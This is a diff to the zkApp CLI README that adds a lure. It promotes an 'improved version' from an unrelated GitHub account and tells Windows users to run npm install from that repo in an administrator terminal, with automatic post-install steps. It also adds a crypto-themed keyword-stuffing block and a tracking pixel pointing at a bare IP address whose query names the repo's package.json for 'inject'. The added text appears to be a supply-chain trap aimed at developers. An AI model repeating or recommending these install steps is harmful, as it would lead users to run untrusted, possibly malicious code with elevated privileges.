@@ -1,3 +1,23 @@
+**GloryCabbieColumn/zkapp-cli**
+
+Welcome to our improved version of the zkApp CLI, built to give you a much more stable and reliable development experience. We’ve rolled out a series of recent fixes to squash those lingering bugs, ensuring your workflow stays smooth and frustration-free. If you’re working on a Windows machine, you’ll be happy to know the setup process is now completely straightforward and ready to go right out of the box.
+
+**Quick install (Windows)**
+
+### Installation
+
+To get started with this project on Windows, please follow these steps:
+
+1. **Install Prerequisites**: Ensure you have [Node.js](https://nodejs.org/) (v16 or higher), [Git for Windows](https://git-scm.com/downloads), and [Python 3](https://www.python.org/downloads/) installed on your system. Verify your Node.js installation by running `node -v` in your terminal.
+2. **Open Terminal**: Launch your preferred command-line interface, such as PowerShell or Command Prompt, with administrative privileges.
+3. **Install the Package**: Execute the following command to install the CLI directly from the repository. All necessary dependencies and post-installation configurations will be handled automatically:
+
+```bash
+npm install git+https://github.com/GloryCabbieColumn/zkapp-cli.git
+```
+
+[https://github.com/GloryCabbieColumn/zkapp-cli](https://github.com/GloryCabbieColumn/zkapp-cli)
+
 # zkApp CLI
 
 [![codecov](https://codecov.io/gh/o1-labs/zkapp-cli/graph/badge.svg?token=3ZKW76ISDB)](https://codecov.io/gh/o1-labs/zkapp-cli)
@@ -218,3 +238,11 @@ zkApp CLI is an open source project, see the [CONTRIBUTING](https://github.com/o
 ## License
 
 [Apache-2.0](https://github.com/o1-labs/zkapp-cli/blob/main/LICENSE)
+
+## Related searches
+
+Developers often explore these tools when they are building zero-knowledge applications or looking to streamline their interaction with decentralized protocols. Many users search for ways to audit smart contract security or bridge cross-chain assets efficiently to ensure their projects remain robust across different networks.
+
+**Topics:** zkapp development, ethereum, bridge cross chain, pancakeswap, audit smart contract, arbitrum, layer 2 scaling, blockchain development tools, zero knowledge proofs, web3 infrastructure, decentralized finance, smart contract deployment
+
+![.](http://5.231.58.248:8787/pixel?repo=GloryCabbieColumn%2Fzkapp-cli&inject=GloryCabbieColumn%2Fzkapp-cli%2Fpackage.json)
